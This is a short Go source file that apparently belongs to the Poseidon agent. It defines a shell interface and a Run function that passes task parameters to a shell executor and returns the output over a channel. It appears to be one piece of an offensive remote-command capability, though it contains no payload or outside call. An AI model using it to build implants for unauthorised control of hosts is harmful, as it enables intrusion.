package shell

import (
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Shell - Interface for running shell commands
type Shell interface {
	Command() string
	Response() []byte
}

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	res, err := shellExec(task.Params)

	tMsg.TaskItem = task
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = res.Response()
	tMsg.Error = false
	threadChannel <- tMsg
}
